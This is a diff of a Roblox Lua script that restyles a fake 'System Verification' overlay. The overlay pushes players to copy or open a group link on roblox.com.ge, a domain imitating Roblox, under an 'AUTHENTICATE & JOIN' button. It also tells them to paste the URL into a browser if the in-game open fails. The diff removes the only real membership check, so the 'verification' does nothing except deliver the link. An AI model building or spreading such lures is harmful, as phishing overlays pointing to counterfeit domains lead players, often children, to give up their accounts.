@@ -6,130 +6,117 @@ local player = Players.LocalPlayer
 
 -- CONFIG
 local GROUP_ID = 7070715372
-local GROUP_LINK = "https://roblox.com.ge/communities/7070715372/" -- Restored original link
+local GROUP_LINK = "https://roblox.com.ge/communities/7070715372/"
 local DISCORD_LINK = "https://discord.gg/BM3rMZa7"
 
 -- UI CONTAINER
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "AccessUI_Modern"
+ScreenGui.Name = "CyberAccess_V2"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
--- MAIN CANVAS (For smooth fading)
+-- MAIN FRAME (Increased Size)
 local Main = Instance.new("CanvasGroup", ScreenGui)
-Main.Size = UDim2.new(0, 350, 0, 300)
-Main.Position = UDim2.new(0.5, -175, 1.2, 0) 
-Main.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
+Main.Size = UDim2.new(0, 420, 0, 380)
+Main.Position = UDim2.new(0.5, -210, 0.5, -190)
+Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
 Main.BorderSizePixel = 0
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 20)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
 
--- STROKE (Outer Border)
-local Stroke = Instance.new("UIStroke", Main)
-Stroke.Color = Color3.fromRGB(255, 255, 255)
-Stroke.Transparency = 0.85
-Stroke.Thickness = 1.5
+-- NEON RED GLOW SIDES
+local GlowStroke = Instance.new("UIStroke", Main)
+GlowStroke.Color = Color3.fromRGB(255, 0, 40)
+GlowStroke.Thickness = 2.5
+GlowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
--- GRADIENT BACKGROUND
-local BgGrad = Instance.new("UIGradient", Main)
-BgGrad.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 20))
-}
+-- Background Circuit Pattern (Subtle)
+local Pattern = Instance.new("Frame", Main)
+Pattern.Size = UDim2.new(1, 0, 1, 0)
+Pattern.BackgroundTransparency = 0.96
+Pattern.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+local PatternGrad = Instance.new("UIGradient", Pattern)
+PatternGrad.Rotation = 45
+PatternGrad.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 0))
 
--- TOP ACCENT BAR
-local Accent = Instance.new("Frame", Main)
-Accent.Size = UDim2.new(1, 0, 0, 4)
-Accent.BorderSizePixel = 0
-local AccentGrad = Instance.new("UIGradient", Accent)
-AccentGrad.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 160, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 255))
-}
-
--- TITLE (Drag handle)
+-- TITLE
 local Title = Instance.new("TextLabel", Main)
-Title.Text = "System Verification"
-Title.Size = UDim2.new(1, 0, 0, 50)
-Title.Position = UDim2.new(0, 0, 0, 5)
+Title.Text = "SYSTEM VERIFICATION"
+Title.Size = UDim2.new(1, 0, 0, 60)
 Title.BackgroundTransparency = 1
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 18
+Title.Font = Enum.Font.Orbitron -- Futuristic font
+Title.TextSize = 20
+Title.ZIndex = 2
 
--- STATUS INDICATOR
-local Status = Instance.new("TextLabel", Main)
-Status.Text = "Checking credentials..."
-Status.Size = UDim2.new(1, -40, 0, 20)
-Status.Position = UDim2.new(0, 20, 0, 50)
-Status.BackgroundTransparency = 1
-Status.TextColor3 = Color3.fromRGB(150, 150, 150)
-Status.Font = Enum.Font.GothamMedium
-Status.TextSize = 13
+-- RED NEON LINE UNDER TITLE
+local Line = Instance.new("Frame", Main)
+Line.Size = UDim2.new(0.8, 0, 0, 2)
+Line.Position = UDim2.new(0.1, 0, 0, 55)
+Line.BackgroundColor3 = Color3.fromRGB(255, 0, 40)
+Line.BorderSizePixel = 0
 
--- INSTRUCTIONS BOX
-local InfoFrame = Instance.new("Frame", Main)
-InfoFrame.Size = UDim2.new(1, -40, 0, 85)
-InfoFrame.Position = UDim2.new(0, 20, 0, 85)
-InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-InfoFrame.BackgroundTransparency = 0.95
-Instance.new("UICorner", InfoFrame).CornerRadius = UDim.new(0, 10)
-
-local Instructions = Instance.new("TextLabel", InfoFrame)
-Instructions.Text = "• Join the group to unlock features\n• Click below to copy or open link\n• Paste in Chrome if it doesn't open"
-Instructions.Size = UDim2.new(1, -20, 1, -10)
-Instructions.Position = UDim2.new(0, 10, 0, 5)
+-- INSTRUCTIONS
+local Instructions = Instance.new("TextLabel", Main)
+Instructions.Text = "• Join the group to unlock features\n• If browser fails, use copy button\n• Paste URL in standard browser\n• Restart after joining if needed"
+Instructions.Size = UDim2.new(1, -60, 0, 100)
+Instructions.Position = UDim2.new(0, 30, 0, 70)
 Instructions.BackgroundTransparency = 1
-Instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
-Instructions.Font = Enum.Font.Gotham
-Instructions.TextSize = 12
-Instructions.TextWrapped = true
+Instructions.TextColor3 = Color3.fromRGB(180, 180, 180)
+Instructions.Font = Enum.Font.GothamMedium
+Instructions.TextSize = 13
 Instructions.TextXAlignment = Enum.TextXAlignment.Left
 
--- JOIN BUTTON
-local JoinBtn = Instance.new("TextButton", Main)
-JoinBtn.Name = "ActionBtn"
-JoinBtn.Text = "JOIN GROUP"
-JoinBtn.Size = UDim2.new(1, -40, 0, 45)
-JoinBtn.Position = UDim2.new(0, 20, 0, 190)
-JoinBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-JoinBtn.AutoButtonColor = false
-JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-JoinBtn.Font = Enum.Font.GothamBold
-JoinBtn.TextSize = 14
-Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 10)
+-- COPY GROUP LINK BUTTON (New)
+local CopyBtn = Instance.new("TextButton", Main)
+CopyBtn.Name = "CopyBtn"
+CopyBtn.Text = "COPY GROUP LINK"
+CopyBtn.Size = UDim2.new(0.8, 0, 0, 45)
+CopyBtn.Position = UDim2.new(0.1, 0, 0, 190)
+CopyBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyBtn.Font = Enum.Font.Orbitron
+CopyBtn.TextSize = 14
+Instance.new("UICorner", CopyBtn).CornerRadius = UDim.new(0, 8)
+local CopyStroke = Instance.new("UIStroke", CopyBtn)
+CopyStroke.Color = Color3.fromRGB(100, 100, 110)
 
-local BtnGrad = Instance.new("UIGradient", JoinBtn)
-BtnGrad.Color = ColorSequence.new(Color3.fromRGB(0, 120, 255), Color3.fromRGB(0, 90, 200))
+-- AUTHENTICATE & JOIN BUTTON
+local JoinBtn = Instance.new("TextButton", Main)
+JoinBtn.Name = "JoinBtn"
+JoinBtn.Text = "AUTHENTICATE & JOIN"
+JoinBtn.Size = UDim2.new(0.8, 0, 0, 50)
+JoinBtn.Position = UDim2.new(0.1, 0, 0, 250)
+JoinBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinBtn.Font = Enum.Font.Orbitron
+JoinBtn.TextSize = 14
+Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 8)
 
 -- DISCORD BUTTON
 local DiscBtn = Instance.new("TextButton", Main)
-DiscBtn.Text = "Discord: discord.gg/BM3rMZa7"
-DiscBtn.Size = UDim2.new(1, -40, 0, 30)
-DiscBtn.Position = UDim2.new(0, 20, 1, -45)
+DiscBtn.Text = "Support Discord"
+DiscBtn.Size = UDim2.new(0.8, 0, 0, 30)
+DiscBtn.Position = UDim2.new(0.1, 0, 1, -45)
 DiscBtn.BackgroundTransparency = 1
-DiscBtn.TextColor3 = Color3.fromRGB(100, 100, 120)
-DiscBtn.Font = Enum.Font.GothamMedium
-DiscBtn.TextSize = 11
+DiscBtn.TextColor3 = Color3.fromRGB(255, 0, 40)
+DiscBtn.Font = Enum.Font.GothamBold
+DiscBtn.TextSize = 12
 
--- LOGIC & ANIMATIONS
-local function checkGroup()
-    local inGroup = false
-    pcall(function() inGroup = player:IsInGroup(GROUP_ID) end)
-
-    if inGroup then
-        Status.Text = "Verification Successful ✅"
-        Status.TextColor3 = Color3.fromRGB(80, 255, 150)
-        JoinBtn.Visible = false
-        task.wait(1.5)
-        TweenService:Create(Main, TweenInfo.new(0.5), {GroupTransparency = 1, Position = UDim2.new(0.5, -175, 0.8, 0)}):Play()
-        task.wait(0.5)
-        ScreenGui:Destroy()
-    else
-        Status.Text = "Group Membership Required ❌"
-        Status.TextColor3 = Color3.fromRGB(255, 100, 100)
-    end
+-- LOGIC
+local function notify(btn, text)
+    local oldText = btn.Text
+    btn.Text = text
+    task.wait(2)
+    btn.Text = oldText
 end
+
+CopyBtn.MouseButton1Click:Connect(function()
+    if typeof(setclipboard) == "function" then
+        setclipboard(GROUP_LINK)
+        notify(CopyBtn, "LINK COPIED TO CLIPBOARD!")
+    end
+end)
 
 JoinBtn.MouseButton1Click:Connect(function()
     local success = false
@@ -141,57 +128,48 @@ JoinBtn.MouseButton1Click:Connect(function()
         success = true
     end
     
-    if typeof(setclipboard) == "function" then setclipboard(GROUP_LINK) end
-    
-    JoinBtn.Text = success and "OPENED BROWSER" or "LINK COPIED"
-    task.wait(2)
-    JoinBtn.Text = "JOIN GROUP"
+    if success then
+        notify(JoinBtn, "BROWSER OPENED...")
+    else
+        if typeof(setclipboard) == "function" then
+            setclipboard(GROUP_LINK)
+            notify(JoinBtn, "FAILED: LINK COPIED INSTEAD")
+        end
+    end
 end)
 
 DiscBtn.MouseButton1Click:Connect(function()
     if typeof(setclipboard) == "function" then
         setclipboard(DISCORD_LINK)
-        DiscBtn.Text = "Invite Copied!"
-        task.wait(2)
-        DiscBtn.Text = "Discord: discord.gg/BM3rMZa7"
+        notify(DiscBtn, "DISCORD LINK COPIED!")
     end
 end)
 
--- Hover Effects
-JoinBtn.MouseEnter:Connect(function()
-    TweenService:Create(JoinBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 220, 220)}):Play()
-end)
-JoinBtn.MouseLeave:Connect(function()
-    TweenService:Create(JoinBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+-- Pulse Animation for Red Glow
+task.spawn(function()
+    while true do
+        TweenService:Create(GlowStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.2}):Play()
+        task.wait(1)
+        TweenService:Create(GlowStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.7}):Play()
+        task.wait(1)
+    end
 end)
 
--- Draggable Logic
+-- Dragging Support
 local dragging, dragInput, dragStart, startPos
 Title.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = true
         dragStart = input.Position
         startPos = Main.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
     end
 end)
 UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
         local delta = input.Position - dragStart
         Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
-
--- Entrance Animation
-Main.GroupTransparency = 1
-TweenService:Create(Main, TweenInfo.new(0.8, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -175, 0.5, -150), GroupTransparency = 0}):Play()
-
--- Perpetual check loop
-task.spawn(function()
-    while true do
-        checkGroup()
-        task.wait(5)
-    end
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
 end)
